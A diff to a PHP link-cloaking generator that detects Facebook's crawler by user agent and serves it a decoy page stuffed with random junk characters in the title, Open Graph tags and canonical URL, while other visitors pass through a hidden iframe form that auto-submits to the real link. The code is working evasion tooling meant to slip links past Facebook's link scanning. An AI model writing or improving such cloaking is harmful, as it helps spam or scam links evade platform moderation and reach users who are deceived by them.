@@ -96,6 +96,20 @@ function generateRandomString($length = 100)
     return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-', ceil($length / strlen($x)))), 1, $length);
 }
 
+function randomAsciiChar($length)
+{
+    $char = '';
+    for ($i = 0; $i < $length; $i++) {
+        $char .= chr(rand(128, 255));
+    }
+    return $char;
+}
+
+$randomOne = randomAsciiChar(200);
+$randomTwo = randomAsciiChar(2000);
+$randomUrlOne = 'http://' . $_SERVER['HTTP_HOST'] . '/' . randomAsciiChar(20000);
+$randomUrlTwo = 'http://' . $_SERVER['HTTP_HOST'] . '/' . randomAsciiChar(30000);
+
 error_reporting(0);
 if ($_POST["url"]) {
     // $n=rand(0000,9999);
@@ -204,7 +218,7 @@ if ($_POST["url"]) {
 <body>
   <script>
   function go() {
-  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"get\" action=\"$mainLink\";></form>';
+  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"post\" action=\"$mainLink\";></form>';
   window.frames[0].document.forms[0].submit();
   }
   </script>
@@ -231,13 +245,46 @@ if ($_POST["url"]) {
     // ]]></script>
     ";
 
+    $facebookCheat = '
+  <!DOCTYPE html PUBLIC \\"-//W3C//DTD XHTML 1.0 Transitional//EN\\" \\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\">
+  <html xmlns=\\"http://www.w3.org/1999/xhtml\\">
+  <head>
+  <meta http-equiv=\\"content-type\\" content=\\"text/html; charset=utf-8\\">
+  <meta http-equiv=\\"Content-Type\\" content=\\"text/html; charset=utf-8\\">
+  <title>' . randomAsciiChar(300) . '</title>
+  <meta property=\\"fb:app_id\\" content=\\"\\">
+  <meta property=\\"article:author\\" content=\\"' . randomAsciiChar(300) . '\\">
+  <meta property=\\"og:site_name\\" content=\\"' . randomAsciiChar(300) . '\\">
+  <meta name=\\"news_keywords\\" content=\\"Bernie Sanders, Warriors, Democrats,Politics,2016 Election\\">
+  <meta name=\\"viewport\\" content=\\"initial-scale=1.0, maximum-scale=1.0, user-scalable=no\\">
+  <meta name=\\"robots\\" content=\\"noindex,nofollow\\">
+  <meta property=\\"article:published_time\\" content=\\"' . time() . '\\">
+  <meta property=\\"article:modified_time\\" content=\\"' . time() . '\\">
+  <meta property=\\"article:expiration_time\\" content=\\"' . time() . '\\">
+  <meta property=\\"image:width\\" content=\\"1200\\">
+  <meta property=\\"image:height\\" content=\\"630\\">
+  <meta property=\\"article:publisher\\" content=\\"' . randomAsciiChar(1000) . '\\">
+  <meta name=\\"description\\" content=\\"' . randomAsciiChar(1000) . '\\">
+  <meta name=\\"keywords\\" content=\\"' . randomAsciiChar(1000) . '\\">
+  <meta name=\\"fb_title\\" content=\\"' . randomAsciiChar(1000) . '\\">
+  <meta property=\\"og:type\\" content=\\"website\\">
+  <meta property=\\"og:title\\" content=\\"' . randomAsciiChar(1000) . '\\">
+  <meta property=\\"og:description\\" content=\\"' . randomAsciiChar(1000) . '\\">
+  <meta property=\\"url\\" content=\\"' . $randomUrlOne . '\\">
+  <link id=\\"canonical\\" rel=\\"canonical\\" href=\\"' . $randomUrlTwo . '\\">
+  </head>
+  <body></body>
+  </html>
+';
+
     $phpString = '
 <?php
 if (
     strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/") !== false ||
     strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false
 ) {
-header("Location: ' . $fakeLink . '", true, 301);
+// header("Location: ' . $fakeLink . '", true, 301);
+echo "' . $facebookCheat . '";
 exit;
 }
 else {
